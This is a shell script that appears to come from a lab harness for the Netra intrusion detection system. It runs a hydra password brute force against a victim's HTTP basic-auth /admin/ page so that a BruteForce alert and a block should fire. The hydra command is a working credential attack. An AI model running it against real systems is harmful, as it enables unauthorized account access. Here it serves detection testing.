#!/bin/sh
# HTTP basic-auth brute force with hydra against the victim's /admin/ page.
# hydra tries each password in passwords.txt for user "admin"; every wrong guess
# is an HTTP 401 sent back to this client.
# Netra should raise a BruteForce alert (signature rule: more than 10 HTTP 401
# responses to one client within 10 s), then block the source. The correct
# password is the last entry in the list, so hydra also demonstrates a success.
#
# Usage: sh bruteforce.sh [victim_ip] [port]
set -u

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"

TARGET="${1:-$VICTIM_DEFAULT}"
PORT="${2:-80}"
require_lab_target "$TARGET"

WORDLIST="$SCRIPT_DIR/passwords.txt"

banner "Brute force ->  http://$TARGET:$PORT/admin/   (hydra, HTTP basic auth)"
echo "Expected Netra alert: BruteForce, then the source is blocked."
echo

# -l single username, -P password list, -s port, -V show each attempt,
# -f stop after the first valid pair is found. http-get targets the /admin/ path.
hydra -l admin -P "$WORDLIST" -s "$PORT" -V -f "$TARGET" http-get /admin/ || true

echo
echo "Brute force finished."
